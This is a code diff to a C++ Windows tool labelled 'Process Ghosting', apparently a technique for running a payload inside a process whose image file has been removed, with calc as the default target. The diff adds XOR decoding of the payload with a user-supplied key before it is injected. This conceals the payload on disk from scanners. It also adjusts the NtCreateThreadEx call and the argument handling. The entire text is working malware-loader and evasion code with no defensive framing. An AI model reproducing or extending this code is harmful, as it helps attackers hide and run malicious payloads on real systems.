@@ -165,16 +165,16 @@ bool process_ghost(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
 #endif
     HANDLE hThread = NULL;
     status = NtCreateThreadEx(&hThread,
-        THREAD_ALL_ACCESS,
-        NULL,
+        THREAD_SET_INFORMATION, //DesiredAccess
+        NULL, //ObjectAttributes
         hProcess,
-        (LPTHREAD_START_ROUTINE) procEntry,
-        NULL,
-        FALSE,
-        0,
-        0,
-        0,
-        NULL
+        (LPTHREAD_START_ROUTINE) procEntry, //StartRoutine
+        NULL, //Argument
+        FALSE, //CreateFlags
+        0, // ZeroBits
+        0, // StackSize
+        0, // MaximumStackSize
+        NULL //AttributeList
     );
 
     if (status != STATUS_SUCCESS) {
@@ -185,6 +185,13 @@ bool process_ghost(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
     return true;
 }
 
+void decode_payload(BYTE* buffer, size_t size, BYTE* key, size_t key_size)
+{
+    for (size_t i = 0; i < size; i++) {
+        buffer[i] ^= key[i % key_size];
+    }
+}
+
 int wmain(int argc, wchar_t *argv[])
 {
 #ifdef _WIN64
@@ -192,15 +199,18 @@ int wmain(int argc, wchar_t *argv[])
 #else
     const bool is32bit = true;
 #endif
-    if (argc < 2) {
+    if (argc < 4) {
         std::cout << "Process Ghosting (";
         if (is32bit) std::cout << "32bit";
         else std::cout << "64bit";
         std::cout << ")\n";
-        std::cout << "params: <payload path> [*target path]\n" << std::endl;
+        std::cout << "params: <payload path> [*key] [*target path]\n" << std::endl;
         std::cout << "* - optional" << std::endl;
-        system("pause");
-        return 0;
+        if (argc < 2) {
+            system("pause");
+            return 0;
+        }
+        std::cout << "---\n" << std::endl;
     }
     if (init_ntdll_func() == false) {
         return -1;
@@ -208,8 +218,9 @@ int wmain(int argc, wchar_t *argv[])
     wchar_t defaultTarget[MAX_PATH] = { 0 };
     get_calc_path(defaultTarget, MAX_PATH, is32bit);
     wchar_t *targetPath = defaultTarget;
-    if (argc >= 3) {
-        targetPath = argv[2];
+    if (argc >= 4) {
+        targetPath = argv[3];
+        std::wcout << "[+] Target: " << targetPath << std::endl;
     }
     wchar_t *payloadPath = argv[1];
     size_t payloadSize = 0;
@@ -218,6 +229,14 @@ int wmain(int argc, wchar_t *argv[])
     if (payladBuf == NULL) {
         std::cerr << "Cannot read payload!" << std::endl;
         return -1;
+    }
+    if (argc >= 3) {
+        std::wstring wkey = argv[2];
+        std::string keyStr(wkey.begin(), wkey.end());
+        if (keyStr.length()) {
+            decode_payload(payladBuf, payloadSize, (BYTE*)keyStr.c_str(), keyStr.length());
+            std::cout << "[+] Decoded with key: " << keyStr.c_str() << std::endl;
+        }
     }
 
     bool is_ok = process_ghost(targetPath, payladBuf, (DWORD) payloadSize);
